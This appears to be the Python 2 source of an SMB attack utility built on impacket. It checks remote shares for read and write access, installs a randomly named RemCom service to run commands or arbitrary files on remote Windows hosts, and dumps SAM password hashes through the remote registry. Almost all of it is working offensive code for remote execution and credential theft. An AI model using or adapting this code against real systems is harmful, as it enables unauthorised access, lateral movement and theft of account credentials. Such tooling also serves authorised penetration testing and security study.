#!/usr/bin/env python
#
# Author: Jack Baker (https://github.com/qwokka/smbcommander)
#
# This product includes software developed by
# SecureAuth Corporation (https://www.secureauth.com/)."
#

import logging
import os
import random
import shlex
import string
import sys
import time

from threading import Thread

import psexec

from impacket.examples import remcomsvc, serviceinstall
from impacket.examples.secretsdump import RemoteOperations, SAMHashes
from impacket.smb import SMB, FILE_READ_DATA, FILE_WRITE_DATA, FILE_DIRECTORY_FILE, \
    FILE_APPEND_DATA
from impacket.smbconnection import SMBConnection
from impacket.structure import Structure

def openPipe(s, tid, pipe, accessMask):
    pipeReady = False
    tries = 50
    while pipeReady is False and tries > 0:
        try:
            s.waitNamedPipe(tid,pipe)
            pipeReady = True
        except:
            tries -= 1
            time.sleep(2)

    if tries == 0:
        raise Exception('Pipe not ready, aborting')

    fid = s.openFile(tid, pipe, accessMask, creationOption = 0x40, fileAttributes = 0x80)

    return fid

def isShareReadable(connection, shareName):
    try:
        connection.listPath(shareName, "\\")
        readable = True
    except Exception, e:
        logging.info(str(e))
        readable = False

    return readable

def isShareWritable(connection, shareName):
    try:
        tid = connection.connectTree(shareName)
    except Exception, e:
        logging.debug(str(e))
        return False

    try:
        fid = connection.openFile(tid, '\\', FILE_WRITE_DATA, creationOption=FILE_DIRECTORY_FILE)
        connection.closeFile(tid, fid)
        writable = True
    except Exception, e:
        logging.debug(str(e))
        writable = False

    return writable

def init_global(cmd):
    global commander
    commander = cmd

def split_args(line):
    try:
        parts = shlex.split(line)
    except ValueError:
        parts = line.split(" ")

    cmd  = parts[0]
    args = parts[1:]

    return cmd, args

def parse_bool(value):
    if value == "true" or value == "1":
        return True
    elif value == "false" or value == "0":
        return False

    return None

# TODO
def psexec_cmd(session, command, path=None):
    if commander.server.service_name is not None:
        svc_name = commander.server.service_name
    else:
        svc_name = "smbcom" + random_string(8)

    connection = SMBConnection(existingConnection = session)

    installService = serviceinstall.ServiceInstall(session,
                                                   remcomsvc.RemComSvc(),
                                                   svc_name)

    installService.install()

    tid = connection.connectTree('IPC$')
    fid_main = openPipe(connection, tid, '\\RemCom_communicaton', 0x12019f)

    packet = psexec.RemComMessage()
    pid = os.getpid()

    packet['Machine'] = ''.join([random.choice(string.letters) for _ in range(4)])
    if path is not None:
        packet['WorkingDir'] = path
    packet['Command'] = command
    packet['ProcessID'] = pid

    connection.writeNamedPipe(tid, fid_main, str(packet))

    stdin_pipe = psexec.CommanderRemoteStdInPipe(connection,
                                 '\\%s%s%d' %
                                 (psexec.RemComSTDIN,
                                  packet['Machine'],
                                  packet['ProcessID']),
                                 FILE_WRITE_DATA | FILE_APPEND_DATA,
                                 installService.getShare())
    stdin_pipe.start()

    stdout_pipe = psexec.CommanderRemoteStdOutPipe(connection,
                                   '\\%s%s%d' %
                                   (psexec.RemComSTDOUT,
                                    packet['Machine'],
                                    packet['ProcessID']),
                                   FILE_READ_DATA)
    stdout_pipe.start()

    stderr_pipe = psexec.CommanderRemoteStdErrPipe(connection,
                                   '\\%s%s%d' %
                                   (psexec.RemComSTDERR,
                                    packet['Machine'],
                                    packet['ProcessID']),
                                   FILE_READ_DATA)
    stderr_pipe.start()

    ans = connection.readNamedPipe(tid, fid_main, 8)

def psexec_file(session, filename):
    try:
        f = open(filename)
    except:
        commander.tui.shell.output_error("Failed to open file \"%s\"" % filename)
        return

    if commander.server.service_name is not None:
        svc_name = commander.server.service_name
    else:
        svc_name = "smbcom" + random_string(8)

    installService = serviceinstall.ServiceInstall(session, f, svc_name)
    installService.install()

    f.close()

    installService.uninstall()

def random_string(length):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

def secretsdump_callback(secret):
    global commander
    commander.tui.shell.output(secret)

def secretsdump(session):
    samHashes = None
    try:
        connection = SMBConnection(existingConnection = session)
        flags1, flags2 = connection.getSMBServer().get_flags()
        flags2 |= SMB.FLAGS2_LONG_NAMES
        connection.getSMBServer().set_flags(flags2=flags2)

        remoteOps  = RemoteOperations(connection, False)
        remoteOps.enableRegistry()
    except Exception, e:
        logging.error(str(e))
        return

    try:
        bootKey = remoteOps.getBootKey()
        remoteOps._RemoteOperations__serviceDeleted = True
        samFileName = remoteOps.saveSAM()

        samHashes = SAMHashes(samFileName,
                              bootKey,
                              isRemote = True,
                              perSecretCallback = secretsdump_callback)

        samHashes.dump()
        logging.info("Done dumping SAM hashes for host: %s", connection.getRemoteHost())
    except Exception, e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
    finally:
        if samHashes is not None:
            samHashes.finish()
        if remoteOps is not None:
            remoteOps.finish()
